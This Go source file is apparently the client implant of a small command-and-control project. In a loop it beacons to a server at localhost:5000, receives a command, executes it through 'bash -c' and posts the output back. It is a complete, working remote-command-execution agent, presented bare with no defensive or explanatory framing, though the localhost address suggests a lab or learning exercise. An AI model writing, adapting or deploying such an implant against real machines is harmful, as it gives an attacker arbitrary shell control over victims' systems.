package main

import (
	"bytes"
	"c2-server/models"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"time"
)

func sendBeacon(id string) *http.Response {
	var beacon models.NewBeacon
	beacon.ID = id

	jsonData, err := encodeBeacon(beacon)
	if err != nil {
		panic(err)
	}
	resp, err := http.Post("http://localhost:5000/beacon", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		panic(err)
	}
	return resp
}

func encodeBeacon(beacon models.NewBeacon) ([]byte, error) {
	return json.Marshal(beacon)
}

func recvTask(r *http.Response) string {
	var task models.NewTask
	err := json.NewDecoder(r.Body).Decode(&task)
	if err != nil {
		fmt.Println("Error receiving task from server: " + err.Error())
	}
	fmt.Println("[server] ---> Task: " + string(task.Command))
	return task.Command
}

func sendAnswer(id string, cmd string) {
	var answer models.NewAnswer
	answer.ID = id
	command := exec.Command("bash", "-c", cmd)
	out, err := command.Output()
	if err != nil {
		answer.Answer = ""
	} else {
		answer.Answer = string(out)
	}
	jsonData, err := json.Marshal(answer)
	if err != nil {
		panic(err)
	}
	_, err = http.Post("http://localhost:5000/answer", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		panic(err)
	}

}

func main() {
	for {
		resp := sendBeacon("1234")
		cmd := recvTask(resp)
		sendAnswer("1234", cmd)
		time.Sleep(4 * time.Second)
	}
}
